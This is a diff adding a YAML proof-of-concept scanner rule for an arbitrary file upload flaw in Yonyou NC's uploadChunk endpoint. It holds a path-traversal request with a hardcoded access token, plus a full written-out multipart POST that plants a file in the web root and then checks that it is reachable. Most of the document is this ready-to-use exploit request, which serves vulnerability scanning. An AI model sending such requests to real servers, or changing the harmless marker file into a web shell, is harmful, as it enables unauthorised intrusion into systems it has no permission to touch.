@@ -1,0 +1,30 @@
+name: poc-yaml-yonyou-nc-uploadChunk-file-upload
+rules:
+  - method: GET
+    path: /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1
+    headers:
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+    expression: |
+      response.body.bcontains(b"Request method 'GET' not supported")
+detail:
+  author: test
+  info: |
+    文件上传包
+    POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
+    Host: xxxxxx
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+    Content-Length: 200
+    Content-Type: multipart/form-data; boundary=c12e782418705a223e5ef5a1d35bdaa4
+
+    --c12e782418705a223e5ef5a1d35bdaa4
+    Content-Disposition: form-data; name="file"; filename="check.txt"
+
+    This website has an arbitrary file upload vulnerability
+    --c12e782418705a223e5ef5a1d35bdaa4--
+    上传成功后访问http://xxxxx/nccloud/check.txt检测是否成功
+  links:
+    - https://mp.weixin.qq.com/s/FHrMKmY5za11WmjHp7uOWw
